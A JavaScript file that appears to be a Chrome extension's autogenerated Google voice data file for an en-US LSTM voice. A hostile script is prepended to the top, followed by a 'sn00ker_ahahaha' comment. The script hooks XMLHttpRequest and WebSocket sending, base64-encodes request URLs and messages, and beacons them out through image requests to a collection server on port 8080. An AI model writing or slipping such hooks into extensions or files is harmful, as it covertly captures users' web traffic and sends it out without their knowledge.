function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
// Copyright (c) 2013 The Chromium OS Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// AUTOGENERATED FILE
//
// This file is autogenerated! If you need to modify it, be sure to
// modify the script that exports Google voice data for use in Chrome.

// Initialize the voice array if it doesn't exist so that voice data files
// can be loaded in any order.

if (!window.voices) {
  window.voices = [];
}

// Add this voice to the global voice array.
window.voices.push({
  'pipelineFile': '/voice_lstm_en-US/lstm/pipeline',
  'prefix': '',
  'voiceType': 'lstm',
  'cacheToDisk': false,
  'lang': 'en-US',
  'gender': 'female',
  'removePaths': [],
  'files': [
    {
      'path': '/voice_lstm_en-US.zvoice',
      'url': '',
      'md5sum': '5f2cc4e2a9a424c7afaaaad1e05b161d',
      'size': 7605811,
    },
  ],
});
